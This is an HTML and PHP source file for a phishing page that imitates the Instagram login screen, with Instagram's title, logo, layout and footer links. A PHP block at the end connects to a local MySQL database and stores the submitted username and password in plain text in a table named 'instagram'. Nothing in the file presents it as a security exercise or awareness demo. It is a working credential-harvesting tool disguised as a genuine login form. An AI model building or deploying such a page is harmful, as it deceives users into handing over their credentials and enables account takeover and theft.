<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" type="image/x-icon" href="https://e7.pngegg.com/pngimages/462/874/png-clipart-instagram-logo-icon-instagram-icon-text-logo.png"/>
    <link rel="stylesheet" href="instacss.css"/>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lobster&display=swap">
    <script src="instajs.js"></script>
</head>
<body>
   
    <form method="post">
        <div class="container">
            
        <h1>Instagram</h1>
        <input class="input" type="text" placeholder=" Phonenumber,username or email" name="username"/><br><br>
        <input  class="input" type="password" id="password" name="password" placeholder=" Password"  oninput="toggleButtonVisibility()">
        <button  type="button" class="show-text" id="showPasswordBtn" onclick="togglePasswordVisibility()">Show</button><br><br>
        <input type="submit" class="submit" value="Log in" />
    </form>
    <p style="text-align:center;padding-bottom:20px;color:rgb(179, 174, 174);font-family:Arial, Helvetica, sans-serif;font-size:15px;">━━━━━━━ OR ━━━━━━━</p>
    <p id="facebook"><img src="https://beeimg.com/images/l17116528332.png" height="15" width="15"/> <a href="https://www.facebook.com/login.php/">Log in with facebook</a></p>
    <p id="pwd"><a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a></p>
    </div>
    <div class="container2">
        <p style="text-align:center;">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" style="color:rgb(33, 127, 204);">Sign up</a></p>
    </div>
    <div class="container3" onclick="open1()">
        <p style="text-align:center;">Get the app.</p>
        <div class="divbtn1">
            <img src="https://storage.needpix.com/rsynced_images/google-1632434_1280.png" height="30px" width="15px"/>
        <button class="btn1"> Get it on <br><b>Google play</b></button>
    </div>
    <div class="divbtn2" onclick="open2()">
            <img src="https://pngimg.com/uploads/microsoft/microsoft_PNG5.png" height="30px" width="20px"/>
        <button class="btn2">Get it from<br><b>Microsoft</b></button>
    </div>
    </div>
    <div class="table">
        <table>
            <tr>
                <td><a class="acolor" href="https://about.meta.com">meta</a></td>
                <td><a class="acolor" href="https://about.instagram.com">About</a></td>
                <td><a class="acolor" href="https://about.instagram.com/blog">blog</a></td>
                <td><a class="acolor" href="https://about.instagram.com/about-us/careers">Jobs</a></td>
                <td><a class="acolor" href="https://help.instagram.com/">Help</a></td>
                <td><a class="acolor" href="https://developers.facebook.com/docs/instagram">API</a></td>
                <td><a class="acolor" href="https://privacycenter.instagram.com">Privacy</a></td>
                <td><a class="acolor" href="https://help.instagram.com">Terms</a></td>
                <td><a class="acolor" href="https://www.instagram.com/explore/locations">Locations</a></td>
                <td><a class="acolor" href="https://www.instagram.com/web/lite">Instagram Lite</a></td>
                <td><a class="acolor" href="https://www.threads.net/login">Threads</a></td>
                <td><a class="acolor" href="https://www.facebook.com/help/instagram">Contact Uploading & Non-Users</a></td>
                <td><a class="acolor" href="https://about.meta.com/technologies/meta-verified">Meta verified</a></td>
            </tr>
            <tr>
                <td colspan="8"></td>
                <td>English</td>
                <td>© 2024 Instagram from Meta</td>
            </tr>
        </table>
    </div>
    

    <?php
    session_start();
    $server="localhost";
    $username="root";
    $pass="";
    $db="lipson";


    $conn = new mysqli($server,$username,$pass,$db);
    if($conn->connect_error){
        die("Connection failed".$conn->connect_error);
    }
    else{
        echo"connected successfully";
    }

    
    $stmt = $conn->prepare("INSERT INTO instagram (username, password) values (?,?)");
    $stmt->bind_param("ss",$username,$password);
    $username=$_POST['username'];
    $password=$_POST['password'];
    if($stmt->execute()){
        echo "inserted successfully";
    }else{
        echo"error".$stmt->error;
    }

    $stmt->close();
    $conn->close(); 



    ?>



</body>
</html>




